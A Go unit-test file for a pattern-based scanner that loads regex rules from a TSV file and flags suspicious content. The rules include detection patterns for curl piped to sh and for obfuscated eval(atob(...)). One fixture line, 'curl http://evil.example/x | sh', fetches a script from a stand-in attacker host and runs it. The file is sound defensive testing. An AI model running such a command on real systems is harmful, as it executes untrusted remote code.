package scan

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writePatterns(t *testing.T, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "patterns.tsv")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestLoadPatterns(t *testing.T) {
	path := writePatterns(t, strings.Join([]string{
		"# a comment line",
		"",
		"CRITICAL\tcurl-pipe-shell\tcurl[^\\n|]*\\|\\s*sh\tremote script piped to shell",
		"HIGH\tno-desc\tfoobar", // description is optional
	}, "\n"))

	s, err := LoadPatterns(path)
	if err != nil {
		t.Fatalf("LoadPatterns: %v", err)
	}
	if s.Count() != 2 {
		t.Fatalf("Count() = %d, want 2", s.Count())
	}
	if s.patterns[0].Name != "curl-pipe-shell" || s.patterns[0].Severity != "CRITICAL" {
		t.Errorf("pattern 0 parsed as %+v", s.patterns[0])
	}
	if s.patterns[1].Description != "" {
		t.Errorf("pattern 1 description = %q, want empty", s.patterns[1].Description)
	}
}

func TestLoadPatternsErrors(t *testing.T) {
	cases := map[string]string{
		"bad regex":        "HIGH\tbad\t[unclosed",
		"too few fields":   "HIGH\tonly-two-fields",
		"no patterns":      "# only a comment\n",
		"blank lines only": "\n\n\n",
	}
	for name, content := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := LoadPatterns(writePatterns(t, content)); err == nil {
				t.Errorf("LoadPatterns accepted %q, want error", content)
			}
		})
	}

	if _, err := LoadPatterns(filepath.Join(t.TempDir(), "nope.tsv")); err == nil {
		t.Error("LoadPatterns accepted a missing file, want error")
	}
}

func TestScan(t *testing.T) {
	path := writePatterns(t, strings.Join([]string{
		"CRITICAL\tcurl-pipe-shell\tcurl[^\\n|]*\\|\\s*sh\tremote script piped to shell",
		"HIGH\teval-base64\teval\\s*\\(\\s*atob\\s*\\(\tobfuscated eval",
	}, "\n"))
	s, err := LoadPatterns(path)
	if err != nil {
		t.Fatal(err)
	}

	content := []byte("line one\nline two\ncurl http://evil.example/x | sh\n")
	matches := s.Scan(content)
	if len(matches) != 1 {
		t.Fatalf("got %d matches, want 1: %+v", len(matches), matches)
	}
	m := matches[0]
	if m.PatternName != "curl-pipe-shell" || m.Severity != "CRITICAL" {
		t.Errorf("match = %+v", m)
	}
	if m.LineHint != 3 {
		t.Errorf("LineHint = %d, want 3", m.LineHint)
	}

	if got := s.Scan([]byte("nothing suspicious here")); len(got) != 0 {
		t.Errorf("clean content produced matches: %+v", got)
	}

	both := []byte("eval(atob(x)); curl a | sh")
	if got := s.Scan(both); len(got) != 2 {
		t.Errorf("got %d matches, want 2: %+v", len(got), got)
	}
}

func TestLineNumber(t *testing.T) {
	content := []byte("a\nb\nc")
	cases := []struct{ offset, want int }{
		{0, 1}, {2, 2}, {4, 3},
		{-1, 0},                  // out of range low
		{len(content) + 1, 0},    // out of range high
		{len(content), 3},        // exactly at end is valid
	}
	for _, c := range cases {
		if got := lineNumber(content, c.offset); got != c.want {
			t.Errorf("lineNumber(offset=%d) = %d, want %d", c.offset, got, c.want)
		}
	}
}
